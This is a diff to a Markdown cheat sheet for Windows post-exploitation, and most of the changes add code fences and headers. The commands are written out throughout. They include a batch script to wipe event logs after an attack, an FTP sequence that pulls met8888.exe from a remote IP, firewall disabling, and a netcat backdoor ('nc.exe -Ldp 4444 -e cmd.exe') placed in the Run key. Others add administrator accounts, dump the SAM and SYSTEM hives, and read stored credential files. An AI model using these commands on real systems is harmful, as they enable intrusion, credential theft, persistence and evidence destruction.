@@ -5,14 +5,14 @@ Your contributions and suggestions are heartily♥ welcome. (✿◕‿◕). Plea
 There seems to be a ton of different lists like this, my goal is to include all of them here as well as a complete list of commands to use once an OS shell has been established and you're unable to use meterpreter. <- You won't find a more definitive list of it's kind.
 
 ## Contents
-
+```
 * [Powershell](#powershell)
 * [Privilege Escalation Tools](#privilege-escalation-tools)
 * [Privilege Escalation Guides/Wiki](#privilege-escalation-guides/wiki)
 * [Post Exploitation Tools](#post-exploitation-tools)
 * [Post Exploitation Guides/Wiki](#post-exploitation-guides/wiki)
 * [Post Exploitation Techniques and Commands](#post-exploitation-techniques-and-commands) *Some of the commands listed are redundant.
-
+```
 
 ## PowerShell
 
@@ -72,10 +72,11 @@ There seems to be a ton of different lists like this, my goal is to include all 
 * [Red Team Field Manual](https://github.com/Agahlot/RTFM/blob/master/rtfm-red-team-field-manual.pdf) - Windows Post-Exploitation techniques and commands.
 
 ### Clear Log Files
+```
 A simple script to clear logs post attack.
-
-**Create a batch file and execute it as admin.**
-
+```
+#### Create a batch file and execute it as admin.**
+```
   @echo off
   FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
   IF (%adminTest%)==(Access) goto noAdmin
@@ -88,37 +89,41 @@ A simple script to clear logs post attack.
   goto :eof
   :noAdmin
   exit
-
+```
 ### Transfer files to compromised host via non-interactive shell
+```
 
 In cases where you want to upload a file onto the compromised machine but you don't have an interactive shell where you simply upload the file, you can write it onto the compromised machine using FTP, feeding it one line at a time.
+```
 
-**Create a blank file to write commands onto**
+Create a blank file to write commands onto**
+```
 ftp -s:ftp_commands.txt
-
-**Echo each command (you can also do this all in one line):**
-
+```
+Echo each command (you can also do this all in one line):**
+```
 echo open 10.9.122.8>ftp_commands.txt
 echo anonymous>ftp_commands.txt
 echo blah>ftp_commands.txt
 echo binary>ftp_commands.txt
 echo get met8888.exe>ftp_commands.txt
 echo bye>ftp_commands.txt
-
-*Instead of ftp_commands.txt, use a unique name, hide the file in a datastream, or hide the file in the folder. aka don't be obvi
+```
+Instead of ftp_commands.txt, use a unique name, hide the file in a datastream, or hide the file in the folder. aka don't be obvious
 
 ### Query state of Firewall, Disable Firewall, Allow a Service Through
 
-**Query state of firewall**:
-
+#### Query state of firewall**:
+```
 netsh firewall show state
+```
 
-**Disable firewall**
-
+#### Disable firewall**
+```
 netsh.exe firewall set opmode mode=disable profile=all
-
-**Allow service through firewall**
-
+```
+#### Allow service through firewall**
+```
 netsh.exe firewall set portopening tcp 123 MYSERVICE enable all
 
 netsh.exe firewall set allowedprogram C:\MYPROGRAM.exe
@@ -126,10 +131,10 @@ netsh.exe firewall set allowedprogram C:\MYPROGRAM.exe
 HKLM\\software\\microsoft\\windows\\ currentversion\\run –d ‘C:\windows\system32\nc.exe -Ldp 4444 -e cmd.exe’ –v netcat
 
 netsh firewall set allowedprogram c:\nc.exe allow_nc ENABLE
+```
 
-
-**Query current user and privilege information**
-
+#### Query current user and privilege information**
+```
 whoami
 
 whoami /all
@@ -139,44 +144,44 @@ whoami /user
 whoami /groups
 
 whoami /priv
-
-**[Users]**
-
+```
+### Users
+```
 net users: list users
-
-**For more info on a user**:
-
+```
+#### For more info on a user**:
+```
 net user <username> (for local user)
 
 net user <username> /domain (for a domain user)
-
-**View domain admins**:
-
+```
+#### View domain admins**:
+```
 net group "Domain Admins" /domain
-
-**View name of domain controller**:
-
+```
+#### View name of domain controller**:
+```
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History" /v DC
-
-**Add user**:
-
+```
+#### Add user**:
+```
 net users <username> <password> /add
-
-**Add user to local administrators group**:
-
+```
+#### Add user to local administrators group**:
+```
 net localgroup administrators <username> /add
-
-**Delete a user**:
-
+```
+#### Delete a user**:
+```
 net users username /delete /domain
-
-**Change user's password**:
-
+```
+#### Change user's password**:
+```
 net users <username> <new_password>
 
-
-**[Accounts & Groups]**
-
+```
+### Accounts & Groups
+```
 net accounts
 
 net accounts /domain
@@ -200,9 +205,9 @@ gpresult: view group policy
 gupdate: update group policy
 
 gpresult /z
-
-**[Network and misc information]**
-
+```
+### Network and misc information
+```
 systeminfo:  lists information about system
 
 ipconfig/all: Query ip configuation
@@ -226,21 +231,21 @@ net time \\computername (Shows the time of target computer)
 net share: view shared resources on network
 
 
-
-**[Query current drives on system]**
-
+```
+### Query current drives on system
+```
 fsutil fsinfo drives
+```
 
-
-**[Grab SAM and SYSTEM files]**
-
+### Grab SAM and SYSTEM files
+```
 type "C:/windows/repair/SAM"
 
 type "C:/windows/repair/SYSTEM"
 
-
-**[Tasks]**
-
+```
+### Tasks
+```
 tasklist /svc: lists running processes
 
 taskkill /PID <process ID> /F : forcibly kill task
@@ -257,9 +262,9 @@ schtasks: Query scheduled tasks that your current user has access to see.
 
 schtasks /query /fo csv /v > %TEMP%
 
-
-**[Netstat]**
-
+```
+### Netstat
+```
 netstat -ano : to see what services are running on what ports
 
 netstat -bano
@@ -268,17 +273,17 @@ netstat -r
 
 netstat -na | findstr :443
 
-
-**[Query information about server and workstation, Workstation domain name and Logon domain]**
-
+```
+### Query information about server and workstation, Workstation domain name and Logon domain
+```
 net config server
 
 net config workstation
 
 
-
-**[Change drive to different drive letter]**
-
+```
+### Change drive to different drive letter
+```
 ex change to D:/ directory and list it's contents:
 
 d: & dir
@@ -286,39 +291,38 @@ d: & dir
 cd /d d: & dir
 
 dir \\computername\share_or_admin_share\ (dir list a remote directory)
-
-**[Cat contents of file located in D:/ directory]**
-
+```
+### Cat contents of file located in D:/ directory
+```
 cd /d & type d:\blah\blah
 
-
-**[net view]**
-
+```
+### net view
+```
 net view /domain[:DomainName]
 
 net view \\computerName
+```
 
-
-**[Services]**
-
-**View list processes started upon startup**
-
+### Services
+#### View list processes started upon startup**
+```
 net start
 
 wmic startup get caption,command
 
-
-**[Query, Stop/Start/Pause Installed Services]**
-
+```
+### Query, Stop/Start/Pause Installed Services
+```
 sc query state= all
 
 sc query <service>
 
 sc <stop> <service>
+```
 
-
-**[Remote System Access]**
-
+### Remote System Access
+```
 reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
 net share \\computername
@@ -328,11 +332,11 @@ tasklist /V /S computername
 qwinsta /SERVER:computername
 
 qprocess /SERVER:computername
+```
 
 
-
-**[WMI]*
-
+### WMIC
+```
 wmic bios
 
 wmic qfe
@@ -362,10 +366,10 @@ wmic share get /ALL (you can use ? for gets help ! )
 wmic startup list full (this can be a huge list!!!)
 
 wmic /node:"hostname" bios get serialnumber (this can be great for finding warranty info about target)
+```
 
-
-**[Reg Command]**
-
+### Reg Command
+```
 reg save HKLM\Security security.hive (Save security hive to a file)
 
 reg save HKLM\System system.hive (Save system hive to a file)
@@ -380,24 +384,24 @@ reg import [FileName ]
 
 reg query [\\TargetIPaddr\] [RegDomain]\[ Key ] /v [Valuename!] (you can to add /s for recurse all values )
 
-
-**[Deleting Logs]**
-
+```
+### Deleting Logs
+```
 wevtutil el (list logs)
 
 wevtutil cl
 
-
-**[Uninstalling Software]**
-
+```
+### Uninstalling Software
+```
 wmic proud get name /value: gets software names
 
 wmic product where name="XXX": call uninstall /Interactive:Off: unintalss software
+```
 
 
-
-**[Permissions]**
-
+### Permissions
+```
 icacls
 
 Grant full access over directory and encompassing folders and files:
@@ -405,30 +409,30 @@ Grant full access over directory and encompassing folders and files:
 icacls "C:\windows" /grant Administrator:F /T
 
 icacls "C:\" /grant "nt authority\system": F /T
+```
 
-
-**[Net use]**
-
+### Net use
+```
 net use: Map network shares
 
 net use \\computername (maps IPC$ which does not show up as a drive)
 
 net use \\computername /user:DOMAINNAME\username password ○ (maps IPC$ under another username)
-
-**[Mount a remote share with the rights of the current user]**:
-
+```
+### Mount a remote share with the rights of the current user:
+```
 net use K: \\<ip>\<share>
 
 dir K:
-
-**[Enable remote desktop]**
-
+```
+### Enable remote desktop
+```
 reg add "HKLM\System\CurrentControlSet\Control\TermServer" /v fDenyTSConnections /t REG_DWORD /f
 
 net session: list session information
-
-**[Other useful Commands]**
-
+```
+### Other useful Commands
+```
 pkgmgr usefull /iu :"Package"
 
 pkgmgr usefull /iu :"TellnetServer": install telnet service
@@ -456,3 +460,4 @@ type "c:\Documents and Settings\Administrator\Desktop\UserMysql.txt"
 type "c:\Documents and Settings\Administrator\Application Data\MySQL\mysqlx_user_connections.xml"
 
 type "C:\documents and settings\administrator\userdata\index.dat"
+```
